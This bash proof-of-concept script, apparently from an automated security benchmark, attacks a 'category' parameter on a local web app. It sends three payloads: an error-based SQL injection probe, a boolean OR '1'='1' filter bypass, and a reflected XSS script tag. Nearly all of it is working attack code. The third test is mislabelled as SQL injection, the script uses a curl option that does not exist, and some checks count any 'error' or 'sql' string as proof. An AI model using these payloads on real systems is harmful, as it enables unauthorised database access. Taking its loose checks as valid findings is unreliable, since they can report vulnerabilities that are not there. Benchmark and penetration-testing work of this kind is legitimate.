#!/bin/bash
# POC: SQL Injection in Category Parameter - demonstrates SQL syntax error, boolean-based injection bypassing filter, and error-based injection
# Target: ./repo
# Created: 2025-11-07T21:42:42.397Z
# Session: benchmark-XBEN-078-24-mhpdbdxp

# SQL Injection in Category Parameter POC
# Target: http://localhost:8080/?category=[payload]
# This POC demonstrates three SQLi techniques

TARGET_URL="http://localhost:8080"
TIMEOUT=5

echo "=========================================="
echo "SQL Injection in Category Parameter - POC"
echo "=========================================="
echo ""

# Test 1: Error-based SQLi - Single quote to reveal SQL structure
echo "[*] Test 1: Error-based SQLi (Single Quote Injection)"
echo "URL: $TARGET_URL/?category=Nature'"
echo "Expected: SQL syntax error revealing query structure"
echo ""
RESPONSE1=$(curl -s --max-time $TIMEOUT "$TARGET_URL/?category=Nature'" 2>&1)

# Check if response contains SQL error
if echo "$RESPONSE1" | grep -q "You have an error in your SQL syntax"; then
    echo "[+] VULNERABLE: SQL syntax error detected!"
    echo "[+] Error message reveals SQL query structure"
    # Extract and display relevant error portion
    ERROR_MSG=$(echo "$RESPONSE1" | grep -oP "You have an error in your SQL syntax[^<]*" | head -1)
    if [ -n "$ERROR_MSG" ]; then
        echo "[+] Error details: $ERROR_MSG"
    fi
    VULN_FOUND=1
else
    echo "[-] No SQL error detected in response"
fi
echo ""

# Test 2: Boolean-based SQLi - OR condition
echo "[*] Test 2: Boolean-based SQLi (OR '1'='1')"
echo "URL: $TARGET_URL/?category=Nature' OR '1'='1"
echo "Expected: Returns ALL posts (bypasses category filter)"
echo ""
RESPONSE2=$(curl -s --max-time $TIMEOUT "$TARGET_URL/?category=Nature' OR '1'='1" 2>&1)

# Count number of posts returned
POST_COUNT=$(echo "$RESPONSE2" | grep -o "<article\|<div class=\"post\|<h2\|<h3" | wc -l)
NORMAL_COUNT=$(curl -s --max-time $TIMEOUT "$TARGET_URL/?category=Nature" 2>&1 | grep -o "<article\|<div class=\"post\|<h2\|<h3" | wc -l)

if [ "$POST_COUNT" -gt "$NORMAL_COUNT" ]; then
    echo "[+] VULNERABLE: Boolean-based SQLi confirmed!"
    echo "[+] Normal Nature category shows ~$NORMAL_COUNT posts"
    echo "[+] OR payload shows ~$POST_COUNT posts (all categories)"
    VULN_FOUND=1
elif echo "$RESPONSE2" | grep -q "OR.*1.*=.*1\|error\|sql"; then
    echo "[+] VULNERABLE: Response indicates SQLi payload was processed"
    VULN_FOUND=1
else
    echo "[*] Response analysis..."
    echo "[*] Response length: ${#RESPONSE2} characters"
fi
echo ""

# Test 3: Error-based with script tags
echo "[*] Test 3: Error-based SQLi with Script Content"
echo "URL: $TARGET_URL/?category=\"><script>alert('XSS')</script>"
echo "Expected: Script content appears in error message or page"
echo ""
PAYLOAD="\"><script>alert('XSS')</script>"
RESPONSE3=$(curl -s --max-time $TIMEOUT --url-encode "$TARGET_URL/?category=$PAYLOAD" 2>&1)

if echo "$RESPONSE3" | grep -q "script>"; then
    echo "[+] VULNERABLE: Script tags reflected in response!"
    echo "[+] Injected content: $PAYLOAD"
    VULN_FOUND=1
elif echo "$RESPONSE3" | grep -q "You have an error\|SQL\|syntax"; then
    echo "[+] VULNERABLE: SQL error detected with injected payload"
    VULN_FOUND=1
fi
echo ""

# Summary
echo "=========================================="
if [ "$VULN_FOUND" = "1" ]; then
    echo "[+] POC SUCCESSFUL: SQL Injection vulnerability confirmed!"
    echo "[+] The category parameter is vulnerable to SQL injection"
    exit 0
else
    echo "[-] Could not confirm SQL injection vulnerability"
    echo "[-] Target may not be vulnerable or may be properly protected"
    exit 1
fi